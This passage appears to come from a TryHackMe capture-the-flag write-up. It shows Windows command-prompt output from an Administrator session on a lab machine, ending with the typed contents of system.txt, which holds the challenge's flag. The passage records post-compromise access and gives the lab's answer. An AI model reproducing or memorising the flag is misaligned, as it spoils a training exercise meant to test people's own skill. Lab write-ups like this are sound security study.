02/22/2021  02:55 PM    <DIR>          Links
02/22/2021  02:55 PM    <DIR>          Music
02/22/2021  02:55 PM    <DIR>          Pictures
02/22/2021  02:55 PM    <DIR>          Saved Games
02/22/2021  02:55 PM    <DIR>          Searches
02/22/2021  02:55 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  21,009,952,768 bytes free

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\Users\Administrator\Desktop

02/23/2021  09:27 PM    <DIR>          .
02/23/2021  09:27 PM    <DIR>          ..
02/23/2021  09:27 PM                37 system.txt
               1 File(s)             37 bytes
               2 Dir(s)  21,009,977,344 bytes free

C:\Users\Administrator\Desktop> file system.txt
'file' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> type system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
C:\Users\Administrator\Desktop> 


```

# Root